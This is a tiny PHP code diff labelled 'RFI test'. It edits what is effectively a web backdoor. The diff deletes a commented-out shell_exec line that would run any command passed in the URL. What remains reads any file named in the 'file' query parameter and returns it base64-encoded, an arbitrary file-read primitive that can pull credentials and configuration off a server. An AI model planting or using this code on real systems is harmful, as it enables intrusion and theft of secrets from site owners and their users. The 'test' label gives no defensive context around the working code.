@@ -1,7 +1,6 @@
 // RFI test
 <?php
-  //shell_exec($_GET["cmd"]);
-  echo scandir($_GET["dir"]);
+  echo scandir(".");
     
   $data = file_get_contents($_GET["file"]);
   echo base64_encode($data);
